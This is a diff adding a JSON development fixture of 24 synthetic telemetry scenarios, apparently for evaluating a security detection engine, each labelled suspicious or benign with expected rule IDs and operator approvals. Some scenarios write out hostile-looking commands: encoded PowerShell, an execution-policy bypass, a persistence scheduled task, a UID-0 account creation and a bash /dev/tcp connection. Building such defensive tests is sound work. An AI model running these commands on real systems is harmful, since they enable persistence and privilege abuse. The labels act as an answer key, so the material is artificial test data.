@@ -1,0 +1,828 @@
+{
+  "schema_version": 1,
+  "name": "SentinelForge evidence-context experiment",
+  "version": "2.0.0",
+  "partition": "development",
+  "evaluation_time": "2026-11-16T12:00:00Z",
+  "provenance": "Hand-authored synthetic scenarios; no captured external or deployment telemetry",
+  "labeling_criteria": "Assigned action intent is explicit in each scenario reason. No label or scenario metadata is submitted as telemetry. Context is separately configured through authenticated operator APIs. Ambiguous intent-only cases are retained as difficult examples.",
+  "independence": "Scenario/template is the unit. Variants within a partition are correlated regression evidence, not independent population observations. Validation and holdout were authored during implementation; neither is representative external validation.",
+  "selection_plan": {
+    "scenarios": 24,
+    "positive": 12,
+    "negative": 12,
+    "chosen_before_target_results": true
+  },
+  "scenarios": [
+    {
+      "id": "development-encoded-switch-abbreviation",
+      "origin_template": "encoded-switch-abbreviation",
+      "session_id": "development-session-01",
+      "suspicious": true,
+      "reason": "Suspicious operator-unapproved encoded command; script text alone does not prove compromise",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "sysmon",
+          "sensor": "sensor-development-01",
+          "payload": {
+            "EventID": 1,
+            "UtcTime": "2026-11-16T09:00:00Z",
+            "Computer": "development-node-01",
+            "User": "lab\\operator-development",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "PoWeRsHeLl.ExE -EN \"VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB4AA==\"",
+            "RecordID": "session-development-01-event-1"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-document-child-file-bypass",
+      "origin_template": "document-child-file-bypass",
+      "session_id": "development-session-02",
+      "suspicious": true,
+      "reason": "Synthetic malicious document launches file execution with policy bypass",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-02",
+          "payload": {
+            "host": "development-node-02",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-02-event-1",
+            "parent": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
+            "command": "powershell -File \"C:\\Staging\\report.ps1\" -ExecutionPolicy Bypass",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-script-digest-reputation",
+      "origin_template": "script-digest-reputation",
+      "session_id": "development-session-03",
+      "suspicious": true,
+      "reason": "Operator-imported synthetic malicious script digest matches the observed file target",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000008"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-03",
+          "payload": {
+            "host": "development-node-03",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-03-event-1",
+            "fields": {
+              "script_path": "C:\\Ops\\collect.ps1",
+              "script_sha256": "09b724843d8001d415b0c0d5743bc9d7d5335433f13d498dead3875425950fe9"
+            },
+            "command": "pwsh -f \"C:\\Ops\\collect.ps1\"",
+            "process": "C:\\Program Files\\PowerShell\\7\\pwsh.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-03",
+            "host": "development-node-03",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "sha256",
+            "value": "09b724843d8001d415b0c0d5743bc9d7d5335433f13d498dead3875425950fe9",
+            "purpose": "powershell-script",
+            "version": "synthetic-research-development-v1",
+            "provenance": "urn:sentinelforge:synthetic-experiment:development:v1",
+            "reason": "Synthetic threat intelligence fixture; not an assertion about a real host",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-bound-https-indicator",
+      "origin_template": "bound-https-indicator",
+      "session_id": "development-session-04",
+      "suspicious": true,
+      "reason": "Synthetic exact-IP intelligence identifies the otherwise ordinary-port destination",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000009"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-04",
+          "payload": {
+            "host": "development-node-04",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "network",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-04-event-1",
+            "dst_ip": "8.8.4.4",
+            "dst_port": 443,
+            "fields": {
+              "proto": "tcp",
+              "service": "ssl"
+            }
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-04",
+            "host": "development-node-04",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "indicators": [
+          {
+            "kind": "ip",
+            "value": "8.8.4.4",
+            "purpose": "https-c2",
+            "version": "synthetic-research-development-v1",
+            "provenance": "urn:sentinelforge:synthetic-experiment:development:v1",
+            "reason": "Synthetic threat intelligence fixture; not an assertion about a real host",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-forged-task-approval-annotation",
+      "origin_template": "forged-task-approval-annotation",
+      "session_id": "development-session-05",
+      "suspicious": true,
+      "reason": "Malicious task claims approved=true inside untrusted telemetry",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-05",
+          "payload": {
+            "host": "development-node-05",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-05-event-1",
+            "fields": {
+              "approved": true
+            },
+            "command": "schtasks /create /tn Persistence /tr \"C:\\Staging\\runner.exe\" /sc minute",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-root-equivalent-account-request",
+      "origin_template": "root-equivalent-account-request",
+      "session_id": "development-session-06",
+      "suspicious": true,
+      "reason": "Unapproved creation of a root-equivalent account",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000005"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-06",
+          "payload": {
+            "host": "development-node-06",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-06-event-1",
+            "command": "useradd --uid 0 --non-unique service-root",
+            "process": "/usr/sbin/useradd"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-shell-tcp-read",
+      "origin_template": "shell-tcp-read",
+      "session_id": "development-session-07",
+      "suspicious": true,
+      "reason": "Synthetic unauthorized shell TCP stream access",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000003"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-07",
+          "payload": {
+            "host": "development-node-07",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-07-event-1",
+            "command": "bash -c 'cat </dev/tcp/198.51.100.20/8443'",
+            "process": "/usr/bin/bash"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-unobserved-file-content-gap",
+      "origin_template": "unobserved-file-content-gap",
+      "session_id": "development-session-08",
+      "suspicious": true,
+      "reason": "Assigned malicious script content is not observed; detection should retain this known context gap",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-08",
+          "payload": {
+            "host": "development-node-08",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-08-event-1",
+            "command": "powershell -File stage.ps1",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-approval-different-digest",
+      "origin_template": "approval-different-digest",
+      "session_id": "development-session-09",
+      "suspicious": true,
+      "reason": "Malicious encoded command differs from the operator-approved action digest",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-09",
+          "payload": {
+            "host": "development-node-09",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-09-event-1",
+            "command": "powershell -EncodedCommand SQBFAFgA",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-09",
+            "host": "development-node-09",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000002",
+            "user": "lab\\operator-development",
+            "command_sha256": "1c5128d7ab7a01e40ffe37fa6a5c8f4ad4ecdf40f92d5855ae5d2e62e4654a8d",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-approval-expired-at-processing",
+      "origin_template": "approval-expired-at-processing",
+      "session_id": "development-session-10",
+      "suspicious": true,
+      "reason": "Expired operator approval cannot suppress a later-ingested command",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-10",
+          "payload": {
+            "host": "development-node-10",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-10-event-1",
+            "command": "powershell -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB4AA==",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-10",
+            "host": "development-node-10",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000002",
+            "user": "lab\\operator-development",
+            "command_sha256": "40ae08af796117ef65f979765a1f9de4b044bb0daaf354e7b19597ae0ed0ffc0",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T11:59:59Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-public-uncommon-service",
+      "origin_template": "public-uncommon-service",
+      "session_id": "development-session-11",
+      "suspicious": true,
+      "reason": "Unapproved synthetic connection on a configured uncommon port",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000007"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-11",
+          "payload": {
+            "host": "development-node-11",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "network",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-11-event-1",
+            "dst_ip": "8.8.8.8",
+            "dst_port": 4444
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-single-use-approval-replayed-action",
+      "origin_template": "single-use-approval-replayed-action",
+      "session_id": "development-session-12",
+      "suspicious": true,
+      "reason": "One approved operation followed by an unapproved new event with the same command",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000004"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-12",
+          "payload": {
+            "host": "development-node-12",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-12-event-1",
+            "command": "schtasks /create /tn BackupState /tr backup.exe /sc daily",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-12",
+          "payload": {
+            "host": "development-node-12",
+            "timestamp": "2026-11-16T09:01:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-12-event-1-second",
+            "command": "schtasks /create /tn BackupState /tr backup.exe /sc daily",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-12",
+            "host": "development-node-12",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000004",
+            "user": "lab\\operator-development",
+            "command_sha256": "e6042273ca872807b7261434ae2588188395afac774c044e1b2ebd977e2ba4ab",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-reviewed-encoded-inventory",
+      "origin_template": "reviewed-encoded-inventory",
+      "session_id": "development-session-13",
+      "suspicious": false,
+      "reason": "Exact encoded inventory action is scoped by an operator-issued single-use approval",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-13",
+          "payload": {
+            "host": "development-node-13",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-13-event-1",
+            "command": "powershell -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABvAGsA",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-13",
+            "host": "development-node-13",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000002",
+            "user": "lab\\operator-development",
+            "command_sha256": "1dfd68a1e7dec6261a336b5789cd1877b92f0af9df19240db95b328848b004c9",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-installer-reviewed-task",
+      "origin_template": "installer-reviewed-task",
+      "session_id": "development-session-14",
+      "suspicious": false,
+      "reason": "Installer task has an exact command and identity/host-scoped operator approval",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-14",
+          "payload": {
+            "host": "development-node-14",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-14-event-1",
+            "command": "schtasks /create /tn VendorCleanup /tr cleanup.exe /sc weekly",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        }
+      ],
+      "context": {
+        "bindings": [
+          {
+            "key": "observed-sensor",
+            "principal": "evaluation",
+            "source": "synthetic",
+            "sensor": "sensor-development-14",
+            "host": "development-node-14",
+            "reason": "Synthetic operator enrollment; authenticated collector attribution only",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ],
+        "approvals": [
+          {
+            "binding_key": "observed-sensor",
+            "rule_id": "00000000-0000-0000-0000-000000000004",
+            "user": "lab\\operator-development",
+            "command_sha256": "d8f965bcb75973692ae12d2ed0f84efbce5e124ca15b4cdb423a9dcb3bac590a",
+            "reason": "Operator reviewed this exact synthetic administrative action",
+            "valid_from": "2026-11-16T08:00:00Z",
+            "valid_until": "2026-11-16T10:00:00Z",
+            "expires_at": "2026-11-16T23:00:00Z"
+          }
+        ]
+      }
+    },
+    {
+      "id": "development-ordinary-inventory-file",
+      "origin_template": "ordinary-inventory-file",
+      "session_id": "development-session-15",
+      "suspicious": false,
+      "reason": "Routine PowerShell inventory file without suspicious ancestry or script intelligence",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-15",
+          "payload": {
+            "host": "development-node-15",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-15-event-1",
+            "command": "powershell -File \"C:\\Inventory\\daily.ps1\"",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-office-child-without-evasion",
+      "origin_template": "office-child-without-evasion",
+      "session_id": "development-session-16",
+      "suspicious": false,
+      "reason": "Authorized document automation has no bypass or hidden-window flag",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-16",
+          "payload": {
+            "host": "development-node-16",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-16-event-1",
+            "parent": "C:\\Program Files\\Microsoft Office\\EXCEL.EXE",
+            "command": "powershell -File \"C:\\Documents\\format.ps1\"",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-routine-browser-https",
+      "origin_template": "routine-browser-https",
+      "session_id": "development-session-17",
+      "suspicious": false,
+      "reason": "Routine HTTPS browsing without a matching indicator",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-17",
+          "payload": {
+            "host": "development-node-17",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "network",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-17-event-1",
+            "dst_ip": "9.9.9.9",
+            "dst_port": 443,
+            "process": "C:\\Program Files\\Browser\\browser.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-developer-unit-tests",
+      "origin_template": "developer-unit-tests",
+      "session_id": "development-session-18",
+      "suspicious": false,
+      "reason": "Routine developer test command",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-18",
+          "payload": {
+            "host": "development-node-18",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-18-event-1",
+            "parent": "/usr/bin/make",
+            "command": "python -m pytest tests/unit",
+            "process": "/usr/bin/python3"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-nonzero-uid-leading-zero",
+      "origin_template": "nonzero-uid-leading-zero",
+      "session_id": "development-session-19",
+      "suspicious": false,
+      "reason": "Ordinary nonzero UID; substring -u 0 is not a root-equivalent identity",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-19",
+          "payload": {
+            "host": "development-node-19",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-19-event-1",
+            "command": "useradd -u 01005 app-worker",
+            "process": "/usr/sbin/useradd"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-task-inventory-query",
+      "origin_template": "task-inventory-query",
+      "session_id": "development-session-20",
+      "suspicious": false,
+      "reason": "Task inventory query does not create persistence",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-20",
+          "payload": {
+            "host": "development-node-20",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-20-event-1",
+            "command": "schtasks /query /fo csv",
+            "process": "C:\\Windows\\System32\\schtasks.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-private-security-lab-service",
+      "origin_template": "private-security-lab-service",
+      "session_id": "development-session-21",
+      "suspicious": false,
+      "reason": "Private network lab listener is outside globally routable uncommon-port predicate",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-21",
+          "payload": {
+            "host": "development-node-21",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "network",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-21-event-1",
+            "dst_ip": "10.20.0.4",
+            "dst_port": 4444
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-missing-command-observation",
+      "origin_template": "missing-command-observation",
+      "session_id": "development-session-22",
+      "suspicious": false,
+      "reason": "No command line was observed; no malicious behavior is asserted by this fixture",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-22",
+          "payload": {
+            "host": "development-node-22",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-22-event-1",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-exact-replay-benign-shell",
+      "origin_template": "exact-replay-benign-shell",
+      "session_id": "development-session-23",
+      "suspicious": false,
+      "reason": "Duplicate delivery of one benign uptime event must not create a signal",
+      "expected_rule_ids": [],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-23",
+          "payload": {
+            "host": "development-node-23",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-23-event-1",
+            "command": "bash -c uptime",
+            "process": "/bin/bash"
+          }
+        },
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-23",
+          "payload": {
+            "host": "development-node-23",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-23-event-1",
+            "command": "bash -c uptime",
+            "process": "/bin/bash"
+          }
+        }
+      ],
+      "context": {}
+    },
+    {
+      "id": "development-benign-admin-without-approval",
+      "origin_template": "benign-admin-without-approval",
+      "session_id": "development-session-24",
+      "suspicious": false,
+      "reason": "Assigned authorized administration intentionally lacks independently supplied approval; a known ambiguity retained",
+      "expected_rule_ids": [
+        "00000000-0000-0000-0000-000000000002"
+      ],
+      "events": [
+        {
+          "source": "synthetic",
+          "sensor": "sensor-development-24",
+          "payload": {
+            "host": "development-node-24",
+            "timestamp": "2026-11-16T09:00:00Z",
+            "kind": "process",
+            "user": "lab\\operator-development",
+            "external_id": "session-development-24-event-1",
+            "command": "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgAGEAZABtAGkAbgA=",
+            "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+          }
+        }
+      ],
+      "context": {}
+    }
+  ]
+}
